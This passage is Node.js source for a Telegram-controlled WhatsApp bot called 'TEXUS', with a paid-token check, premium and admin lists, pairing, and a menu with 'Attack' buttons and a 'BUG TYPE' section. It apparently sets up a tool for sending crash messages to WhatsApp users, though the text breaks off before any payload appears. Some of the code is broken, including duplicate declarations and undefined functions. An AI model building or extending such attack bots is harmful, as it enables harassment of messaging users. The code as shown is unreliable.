const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');

// ---------- ( Set Const ) ----------- \\
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const axios = require("axios");
const chalk = require("chalk"); 
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const ONLY_FILE = path.join(__dirname, "SETTINGS", "gconly.json");
const cd = path.join(__dirname, "SETTINGS", "cd.json");
const CHANNEL_USERNAME = "@r7xnight";
const GROUP_USERNAME = "@publicr7x";
// PLUGIN
const toUrlPlugin = require('./PLUGIN/TOURL')(bot);
const toUrlPlugin = require('./PLUGIN/KICK')(bot);
const toUrlPlugin = require('./PLUGIN/GETPP')(bot);
///==== (Random Image) =====\\\
function getRandomImage() {
const images = [
"https://files.catbox.moe/1ssubr.jpg",
];
  return images[Math.floor(Math.random() * images.length)];
}
// GITHUB
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/Damascusnew/Damscustokens/refs/heads/main/tokens.json"; 
// ----------------- ( Pengecekan Token ) ------------------- \\
async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red(`
═══════════════════════════════════════════
HADEH MINIMAL BUY KE DAXY KOK MULUNG SI GOBLOK!!!
═══════════════════════════════════════════
⠀⣠⣶⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠹⢿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡏⢀⣀⡀⠀⠀⠀⠀⠀
⠀⠀⣠⣤⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣟⣋⣼⣽⣾⣽⣦⡀⠀⠀⠀
⢀⣼⣿⣷⣾⡽⡄⠀⠀⠀⠀⠀⠀⠀⣴⣶⣶⣿⣿⣿⡿⢿⣟⣽⣾⣿⣿⣦⠀⠀
⣸⣿⣿⣾⣿⣿⣮⣤⣤⣤⣤⡀⠀⠀⠻⣿⡯⠽⠿⠛⠛⠉⠉⢿⣿⣿⣿⣿⣷⡀
⣿⣿⢻⣿⣿⣿⣛⡿⠿⠟⠛⠁⣀⣠⣤⣤⣶⣶⣶⣶⣷⣶⠀⠀⠻⣿⣿⣿⣿⣇
⢻⣿⡆⢿⣿⣿⣿⣿⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠀⣠⣶⣿⣿⣿⣿⡟
⠈⠛⠃⠈⢿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠋⠉⠁⠀⠀⠀⠀⣠⣾⣿⣿⣿⠟⠋⠁⠀
⠀⠀⠀⠀⠀⠙⢿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣼⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
`));
   process.exit(1);
   }
   console.log(chalk.green(` 💡-# Token Valid⠀⠀`));
  startBot();
  initializeWhatsAppConnections();
  }



function startBot() {
  console.log(chalk.red(`
⢻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⠤⠤⠴⢶⣶⡶⠶⠤⠤⢤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⠁
⠀ ⠻⣯⡗⢶⣶⣶⣶⣶⢶⣤⣄⣀⣀⡤⠒⠋⠁⠀⠀⠀⠀⠚⢯⠟⠂⠀⠀⠀⠀⠉⠙⠲⣤⣠⡴⠖⣲⣶⡶⣶⣿⡟⢩⡴⠃⠀
 ⠀⠀⠈⠻⠾⣿⣿⣬⣿⣾⡏⢹⣏⠉⠢⣄⣀⣀⠤⠔⠒⠊⠉⠉⠉⠉⠑⠒⠀⠤⣀⡠⠚⠉⣹⣧⣝⣿⣿⣷⠿⠿⠛⠉⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⣹⠟⠛⠿⣿⣤⡀⣸⠿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠾⣇⢰⣶⣿⠟⠋⠉⠳⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⡞⠁⠀⠀⡠⢾⣿⣿⣯⠀⠈⢧⡀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠁⢀⣿⣿⣯⢼⠓⢄⠀⢀⡘⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣰⣟⣟⣿⣀⠎⠀⠀⢳⠘⣿⣷⡀⢸⣿⣶⣤⣄⣀⣤⢤⣶⣿⡇⢀⣾⣿⠋⢀⡎⠀⠀⠱⣤⢿⠿⢷⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣰⠋⠀⠘⣡⠃⠀⠀⠀⠈⢇⢹⣿⣿⡾⣿⣻⣖⠛⠉⠁⣠⠏⣿⡿⣿⣿⡏⠀⡼⠀⠀⠀⠀⠘⢆⠀⠀⢹⡄⠀⠀⠀
⠀⠀⠀⢰⠇⠀⠀⣰⠃⠀⠀⣀⣀⣀⣼⢿⣿⡏⡰⠋⠉⢻⠳⣤⠞⡟⠀⠈⢣⡘⣿⡿⠶⡧⠤⠄⣀⣀⠀⠈⢆⠀⠀⢳⠀⠀⠀
⠀⠀⠀⡟⠀⠀⢠⣧⣴⣊⣩⢔⣠⠞⢁⣾⡿⢹⣷⠋⠀⣸⡞⠉⢹⣧⡀⠐⢃⢡⢹⣿⣆⠈⠢⣔⣦⣬⣽⣶⣼⣄⠀⠈⣇⠀⠀
⠀⠀⢸⠃⠀⠘⡿⢿⣿⣿⣿⣛⣳⣶⣿⡟⣵⠸⣿⢠⡾⠥⢿⡤⣼⠶⠿⡶⢺⡟⣸⢹⣿⣿⣾⣯⢭⣽⣿⠿⠛⠏⠀⠀⢹⠀⠀
⠀⠀⢸⠀⠀⠀⡇⠀⠈⠙⠻⠿⣿⣿⣿⣇⣸⣧⣿⣦⡀⠀⣘⣷⠇⠀⠄⣠⣾⣿⣯⣜⣿⣿⡿⠿⠛⠉⠀⠀⠀⢸⠀⠀⢸⡆⠀
⠀⠀⢸⠀⠀⠀⡇⠀⠀⠀⠀⣀⠼⠋⢹⣿⣿⣿⡿⣿⣿⣧⡴⠛⠀⢴⣿⢿⡟⣿⣿⣿⣿⠀⠙⠲⢤⡀⠀⠀⠀⢸⡀⠀⢸⡇⠀
⠀⠀⢸⣀⣷⣾⣇⠀⣠⠴⠋⠁⠀⠀⣿⣿⡛⣿⡇⢻⡿⢟⠁⠀⠀⢸⠿⣼⡃⣿⣿⣿⡿⣇⣀⣀⣀⣉⣓⣦⣀⣸⣿⣿⣼⠁⠀
⠀⠀⠸⡏⠙⠁⢹⠋⠉⠉⠉⠉⠉⠙⢿⣿⣅⠀⢿⡿⠦⠀⠁⠀⢰⡃⠰⠺⣿⠏⢀⣽⣿⡟⠉⠉⠉⠀⠈⠁⢈⡇⠈⠇⣼⠀⠀
⠀⠀⠀⢳⠀⠀⠀⢧⠀⠀⠀⠀⠀⠀⠈⢿⣿⣷⣌⠧⡀⢲⠄⠀⠀⢴⠃⢠⢋⣴⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⡸⠀⠀⢠⠇⠀⠀
⠀⠀⠀⠈⢧⠀⠀⠈⢦⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣧⠐⠸⡄⢠⠀⢸⠀⢠⣿⣟⡿⠋⠀⠀⠀⠀⠀⠀⠀⡰⠁⠀⢀⡟⠀⠀⠀
⠀⠀⠀⠀⠈⢧⠀⠀⠀⠣⡀⠀⠀⠀⠀⠀⠀⠈⠛⢿⡇⢰⠁⠸⠄⢸⠀⣾⠟⠉⠀⠀⠀⠀⠀⠀⠀⢀⠜⠁⠀⢀⡞⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⢧⡀⠀⠀⠙⢄⠀⠀⠀⠀⠀⠀⠀⢨⡷⣜⠀⠀⠀⠘⣆⢻⠀⠀⠀⠀⠀⠀⠀⠀⡴⠋⠀⠀⣠⠎⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠑⢄⠀⠀⠀⠑⠦⣀⠀⠀⠀⠀⠈⣷⣿⣦⣤⣤⣾⣿⢾⠀⠀⠀⠀⠀⣀⠴⠋⠀⠀⢀⡴⠃⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⢄⡀⢸⣶⣿⡑⠂⠤⣀⡀⠱⣉⠻⣏⣹⠛⣡⠏⢀⣀⠤⠔⢺⡧⣆⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⢽⡁⠀⠀⠀⠀⠈⠉⠙⣿⠿⢿⢿⠍⠉⠀⠀⠀⠀⠉⣻⡯⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠲⠤⣀⣀⡀⠀⠈⣽⡟⣼⠀⣀⣀⣠⠤⠒⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⢻⡏⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈
`));


console.log(chalk.red(`
═════════════════════════
  🔓  𝗙𝗢𝗥 𝗧𝗢𝗞𝗘𝗡 𝗩𝗔𝗟𝗜𝗗     
═════════════════════════
`));
}
validateToken();
let sock;

function saveActiveSessions(botNumber) {
        try {
        const sessions = [];
        if (fs.existsSync(SESSIONS_FILE)) {
        const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
        }
        } else {
        sessions.push(botNumber);
        }
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
        } catch (error) {
        console.error("Error saving session:", error);
        }
        }

async function initializeWhatsAppConnections() {
          try {
                   if (fs.existsSync(SESSIONS_FILE)) {
                  const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
                  console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

                  for (const botNumber of activeNumbers) {
                  console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
                  const sessionDir = createSessionDir(botNumber);
                  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

                  sock = makeWASocket ({
                  auth: state,
                  printQRInTerminal: true,
                  logger: P({ level: "silent" }),
                  defaultQueryTimeoutMs: undefined,
                  });

                  await new Promise((resolve, reject) => {
                  sock.ev.on("connection.update", async (update) => {
                  const { connection, lastDisconnect } = update;
                  if (connection === "open") {
                  console.log(`Bot ${botNumber} terhubung!`);
                  sessions.set(botNumber, sock);
                  resolve();
                  } else if (connection === "close") {
                  const shouldReconnect =
                  lastDisconnect?.error?.output?.statusCode !==
                  DisconnectReason.loggedOut;
                  if (shouldReconnect) {
                  console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                  await initializeWhatsAppConnections();
                  } else {
                  reject(new Error("Koneksi ditutup"));
                  }
                  }
                  });

                  sock.ev.on("creds.update", saveCreds);
                  });
                  }
                }
             } catch (error) {
          console.error("Error initializing WhatsApp connections:", error);
           }
         }

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}
////=== Intalasi WhatsApp ===\\\
async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
<blockquote>𝕿𝕰𝖃𝖀𝕾 𝕻𝕬𝕴𝕽𝕴𝕹𝕲</blockquote>
▢ Prepare the pairing code...
╰➤ Number : ${botNumber}
`,
      { parse_mode: "HTML" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
<blockquote>𝕿𝕰𝖃𝖀𝕾 𝕻𝕬𝕴𝕽𝕴𝕹𝕲</blockquote>
▢ Prosess connecting
╰➤ Number : ${botNumber}
╰➤ Status : Connecting...
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
<blockquote>𝕿𝕰𝖃𝖀𝕾 𝕻𝕬𝕴𝕽𝕴𝕹𝕲</blockquote>
▢ Connection closed.
╰➤ Number : ${botNumber}
╰➤ Status : Failed ❌
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
<blockquote>𝕿𝕰𝖃𝖀𝕾 𝕻𝕬𝕴𝕽𝕴𝕹𝕲</blockquote>
▢ Connection Success!
╰➤ Number : ${botNumber}
╰➤ Status : Success Connected
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "HTML",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
  const code = await sock.requestPairingCode(botNumber, "TEXUSVIP");
  const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

  await bot.editMessageText(
    `
<blockquote>𝕿𝕰𝖃𝖀𝕾 𝕻𝕬𝕴𝕽𝕴𝕹𝕲</blockquote>
▢ Your Code Pairing..
╰➤ Number : ${botNumber}
╰➤ Code : ${formattedCode}
`,
    {
      chat_id: chatId,
      message_id: statusMessage,
      parse_mode: "HTML",
  });
};
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
<blockquote>𝕿𝕰𝖃𝖀𝕾 𝕻𝕬𝕴𝕽𝕴𝕹𝕲</blockquote>
▢ Try again...
╰➤ Number : ${botNumber}
╰➤ Status : ${error.message} Error⚠️
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

async function getWhatsAppChannelInfo(link) {
    if (!link.includes("https://whatsapp.com/channel/")) return { error: "Link tidak valid!" };
    
    let channelId = link.split("https://whatsapp.com/channel/")[1];
    try {
        let res = await sock.newsletterMetadata("invite", channelId);
        return {
            id: res.id,
            name: res.name,
            subscribers: res.subscribers,
            status: res.state,
            verified: res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"
        };
    } catch (err) {
        return { error: "Gagal mengambil data! Pastikan channel valid." };
    }
}
// --------------------- ( Bot Setting ) ---------------------- \\

function isGroupOnly() {
         if (!fs.existsSync(ONLY_FILE)) return false;
        const data = JSON.parse(fs.readFileSync(ONLY_FILE));
        return data.groupOnly;
        }


function setGroupOnly(status)
            {
            fs.writeFileSync(ONLY_FILE, JSON.stringify({ groupOnly: status }, null, 2));
            }

// ---------- ( Read File And Save Premium - Admin - Owner ) ----------- \\
            let premiumUsers = JSON.parse(fs.readFileSync('./DATABASE/premium.json'));
            let adminUsers = JSON.parse(fs.readFileSync('./DATABASE/admin.json'));

            function ensureFileExists(filePath, defaultData = []) {
            if (!fs.existsSync(filePath)) {
            fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
            }
            }
    
            ensureFileExists('./DATABASE/premium.json');
            ensureFileExists('./DATABASE/admin.json');


            function savePremiumUsers() {
            fs.writeFileSync('./DATABASE/premium.json', JSON.stringify(premiumUsers, null, 2));
            }

            function saveAdminUsers() {
            fs.writeFileSync('./DATABASE/admin.json', JSON.stringify(adminUsers, null, 2));
            }

    function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
    if (eventType === 'change') {
    try {
    const updatedData = JSON.parse(fs.readFileSync(filePath));
    updateCallback(updatedData);
    console.log(`File ${filePath} updated successfully.`);
    } catch (error) {
    console.error(`Error updating ${filePath}:`, error.message);
    }
    }
    });
    }

    watchFile('./DATABASE/premium.json', (data) => (premiumUsers = data));
    watchFile('./DATABASE/admin.json', (data) => (adminUsers = data));


   function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}
if (!fs.existsSync(ONLY_FILE)) {
  fs.writeFileSync(ONLY_FILE, JSON.stringify({ groupOnly: false }, null, 2));
}

if (!fs.existsSync(cd)) {
  fs.writeFileSync(cd, JSON.stringify({ time: 0, users: {} }, null, 2));
}

function formatRuntime(seconds) {
        const days = Math.floor(seconds / (3600 * 24));
        const hours = Math.floor((seconds % (3600 * 24)) / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        const secs = seconds % 60;  
        return `${hours}h, ${minutes}m, ${secs}s`;
        }

       const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
        const now = Math.floor(Date.now() / 1000);
        return formatRuntime(now - startTime);
        }

function getSpeed() {
        const startTime = process.hrtime();
        return getBotSpeed(startTime); 
}


function getCurrentDate() {
        const now = new Date();
        const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
         return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}

        let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
        fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
        if (cooldownData.users[userId]) {
                const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
                if (remainingTime > 0) {
                        return Math.ceil(remainingTime / 1000); 
                }
        }
        cooldownData.users[userId] = Date.now();
        saveCooldown();
        setTimeout(() => {
                delete cooldownData.users[userId];
                saveCooldown();
        }, cooldownData.time);
        return 0;
}

function setCooldown(timeString) {
        const match = timeString.match(/(\d+)([smh])/);
        if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

        let [_, value, unit] = match;
        value = parseInt(value);

        if (unit === "s") cooldownData.time = value * 1000;
        else if (unit === "m") cooldownData.time = value * 60 * 1000;
        else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

        saveCooldown();
        return `Cooldown diatur ke ${value}${unit}`;
}

async function checkChannelMembership(userId) {
  try {
    const chatMember = await bot.getChatMember(CHANNEL_USERNAME, userId);
    return ["member", "administrator", "creator"].includes(chatMember.status);
  } catch (err) {
    return false;
  }
}

// 🔹 Middleware untuk cek join

// 🔹 Helper untuk membungkus command dengan requireJoin

///===== ( Menu Utama ) =====\\\
const bugRequests = {};
// === Ambil Username Bot otomatis ===
let botUsername = "MyBot"; // default supaya aman
bot.getMe().then(info => {
  botUsername = info.username;
}).catch(err => {
  console.error("❌ Gagal ambil username bot:", err.message);
});
// ===== COMMAND START =====
bot.onText(/\/start/, async (msg) => {
  sendUsageNotif(BOT_TOKEN, msg.from);

  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const img = getRandomImage();
  const runtime = getBotRuntime();
  const username = msg.from.username || "User";

  // ===== ANIMASI TEKS AWAL =====
  let tempMsg;

  tempMsg = await bot.sendMessage(chatId, "PROSES TOLONG TUNGGU").catch(() => null);
  await new Promise(r => setTimeout(r, 2500));
  if (tempMsg) await bot.deleteMessage(chatId, tempMsg.message_id).catch(() => {});

  tempMsg = await bot.sendMessage(chatId, "DEVELOPER : @ALYWASR7X").catch(() => null);
  await new Promise(r => setTimeout(r, 1500));
  if (tempMsg) await bot.deleteMessage(chatId, tempMsg.message_id).catch(() => {});

  tempMsg = await bot.sendMessage(chatId, "VERSION: 1.1 VIP").catch(() => null);
  await new Promise(r => setTimeout(r, 3000));
  if (tempMsg) await bot.deleteMessage(chatId, tempMsg.message_id).catch(() => {});

  // ===== LOADING BAR =====
  const total = 10;
  let animMsg = await bot.sendMessage(
    chatId,
    "LOADING BOT...\n[░░░░░░░░░░] 0%"
  ).catch(() => null);

  if (animMsg) {
    for (let i = 1; i <= total; i++) {
      const percent = i * 10;
      const bar = `[${"█".repeat(i)}${"░".repeat(10 - i)}] ${percent}%`;
      await new Promise(r => setTimeout(r, 300));
      await bot.editMessageText(`LOADING BOT...\n${bar}`, {
        chat_id: chatId,
        message_id: animMsg.message_id
      }).catch(() => {});
    }

    await bot.editMessageText("SUCCESS LOADING BOT...", {
      chat_id: chatId,
      message_id: animMsg.message_id
    }).catch(() => {});

    await new Promise(r => setTimeout(r, 700));
    await bot.deleteMessage(chatId, animMsg.message_id).catch(() => {});
  }

  // ===== CAPTION =====
  const caption = `\`\`\`
ハローハウ ${username}, 私はあなたを助けることができるロボットです。
できるだけ私を活用してください。

╭––『 𝕿𝕰𝖃𝖀𝕾 𝖁1.1 』──╮
├❒ 𝕾𝕿𝕬𝕿𝖀𝕾 : ONLINE
├❒ 𝖀𝕻𝕿𝕴𝕸𝕰 : ${runtime}
├❒ 𝖀𝕾𝕰𝕽 : ${username}
╰─────────────────
╭––『 𝖀𝕾𝕰𝕽 𝕴𝕹𝕱𝕺 』───╮
├❒ 𝕹𝕬𝕸𝕰 : @${username}
├❒ 𝕴𝕯 : ${userId}
╰─────────────────
╭––『 𝕭𝕺𝕿 𝕴𝕹𝕱𝕺 』─────╮
├❒ 𝕬𝖀𝕿𝕳𝕺𝕽 : 𝕽7𝖃/𝕯𝕬𝖃𝖄
├❒ 𝕷𝕬𝕹𝕲𝖀𝕬𝕲𝕰 : 𝕵𝕬𝖁𝕬𝕾𝕮𝕽𝕴𝕻𝕿
╰─────────────────
\`\`\``;

  // ===== SEND PHOTO =====
  const sentPhoto = await bot.sendPhoto(chatId, img, {
    caption,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "𝕬𝖙𝖙𝖆𝖈𝖐 𝖁1", callback_data: "attack1" },
          { text: "𝕾𝖊𝖙𝖙𝖎𝖓𝖌𝖘", callback_data: "owner" },
          { text: "𝕬𝖙𝖙𝖆𝖈𝖐 𝖛2", callback_data: "attack2" }
        ],
        [
          { text: "𝕿𝕺𝕺𝕷𝕾 𝖁1", callback_data: "tools" },
          { text: "𝕿𝕺𝕺𝕷𝕾 𝖁2", callback_data: "tools2" }
        ],
        [
          { text: "𝕻𝕽𝕺𝕯𝖀𝕶", callback_data: "produk" },
          { text: "𝕿𝕼𝕿𝕺", callback_data: "tqto" },
          { text: "𝕴𝕹𝕱𝕺𝕸𝕬𝕿𝕴𝕺𝕹", url: "https://t.me/r7xnight" }
        ]
      ]
    }
  });

  // ===== SEND AUDIO REPLY =====
  await bot.sendAudio(
    chatId,
    "https://s5.aconvert.com/convert/p3r68-cdx67/9qhh2-j9f3u.mp3",  {
      reply_to_message_id: sentPhoto.message_id
    }
  );
}));




// ---------- CALLBACK ----------
bot.on("callback_query", async (q) => {
  const chatId = q.message.chat.id;
  const data = q.data;
  const img = getRandomImage();
  const runtime = getBotRuntime();
  const userId = q.from.id;
  const username = q.from.username
    ? `@${q.from.username}`
    : "Tidak ada username";

  let caption = "";
  let keyboard = [[{ text: "ʙᴀᴄᴋ", callback_data: "mainmenu" }]];

  if (data === "owner") {
    caption =`\`\`\`
ハローハウ ${username}, 私はあなたを助けることができるロボットです。
できるだけ私を活用してください。

╭––『 𝕿𝕰𝖃𝖀𝕾 𝖁1.1 』──╮
├❒ 𝕾𝕿𝕬𝕿𝖀𝕾 : ᴏɴʟɪɴᴇ
├❒ 𝖀𝕻𝕿𝕴𝕸𝕰 : ${runtime}
├❒ 𝖀𝕾𝕰𝕽 : ${username}
╰─────────────────
╭––『 𝖀𝕾𝕰𝕽 𝕴𝕹𝕱𝕺 』─────╮
├❒ 𝕹𝕬𝕸𝕰 : @${username}
├❒ 𝕴𝕯 : ${userId}
╰──────────────────
╭───『 𝕺𝖂𝕹𝕰𝕽 𝕸𝕰𝕹𝖀 』────────╮
├❒ /𝕬𝕯𝕯𝕻𝕽𝕰𝕸 𝕴𝕯,𝕳𝕬𝕽𝕴
├❒ /𝕬𝕯𝕯𝕬𝕯𝕸𝕴𝕹 𝕴𝕯,𝕳𝕬𝕽𝕴
├❒ /𝕯𝕰𝕷𝕬𝕯𝕯𝕻𝕽𝕰𝕸 𝕴𝕯
├❒ /𝕯𝕰𝕷𝕬𝕯𝕸𝕴𝕹 𝕴𝕯
├❒ /𝕾𝕰𝕿𝕵𝕰𝕯𝕬 𝕾/𝕸
├❒ /𝕮𝕰𝕶𝕴𝕯𝕮𝕳 𝕷𝕴𝕹𝕶
├❒ /𝕲𝕮𝕺𝕹𝕷𝖄 𝕺𝕹/𝕺𝕱𝕱
├❒ /𝖃𝕻𝕬𝕴𝕽𝕴𝕹𝕲 62𝖝𝖝𝖝
╰─────────────────────────╯
\`\`\``;
  }

  else if (data === "attack1") {
    caption = `\`\`\`
ハローハウ ${username}, 私はあなたを助けることができるロボットです。
できるだけ私を活用してください。

╭––『 𝕿𝕰𝖃𝖀𝕾 𝖁1.1 』──╮
├❒ 𝕾𝕿𝕬𝕿𝖀𝕾 : ᴏɴʟɪɴᴇ
├❒ 𝖀𝕻𝕿𝕴𝕸𝕰 : ${runtime}
├❒ 𝖀𝕾𝕰𝕽 : ${username}
╰─────────────────
╭––『 𝖀𝕾𝕰𝕽 𝕴𝕹𝕱𝕺 』─────╮
├❒ 𝕹𝕬𝕸𝕰 : @${username}
├❒ 𝕴𝕯 : ${userId}
╰──────────────────
╭––『 𝕭𝖀𝕲 𝕿𝖄𝕻𝕰 』─────╮
